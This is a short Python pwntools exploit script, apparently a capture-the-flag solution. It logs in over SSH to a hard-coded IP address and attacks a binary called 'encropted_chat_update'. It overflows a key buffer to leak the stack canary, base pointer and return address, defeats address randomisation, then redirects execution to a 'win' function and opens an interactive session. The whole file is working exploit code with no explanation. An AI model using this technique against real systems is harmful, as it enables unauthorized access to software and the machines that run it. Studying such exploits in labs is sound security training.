#!/usr/bin/env python3
from pwn import *

io = ssh('u0_a82', '20.91.248.143', port=2222, password='')
io2 = io.process('/data/local/system/encropted_chat_update')

WIN_OFFSET = 0x12DB
RET_OFFSET = 0x16C2

io2.recvuntil(b'> ')
io2.sendline(b'update')
io2.recvuntil(b'Enter key: ')

payload = b'X'*41
io2.send(payload)
io2.recvuntil(b'X'*41)
cookie = u64(b'\0' + io2.recv(7))
basepointer = u64(io2.recv(6) + b'\0\0')
log.info('Cookie: %x', cookie)
log.info('Base pointer: %x', basepointer)
io2.recvline()

io2.recvuntil(b'Enter key: ')
payload2 = b'X'*(40+8+8)
io2.send(payload2)
io2.recvuntil(b'X'*(40+8+8))
ret = u64(io2.recv(6) + b'\0\0')
log.info('Ret: %x', ret)

base_addr = ret - RET_OFFSET
win_addr = base_addr + WIN_OFFSET

payload3 = b'X'*40
payload3 += p64(cookie) + p64(base_addr) + p64(win_addr)
io2.recvuntil(b'Enter key: ')
io2.send(payload3)
io2.recvline()

io2.recvuntil(b'Enter key: ')
io2.send(b'totally_valid_key')
io2.recvline()

io2.interactive()
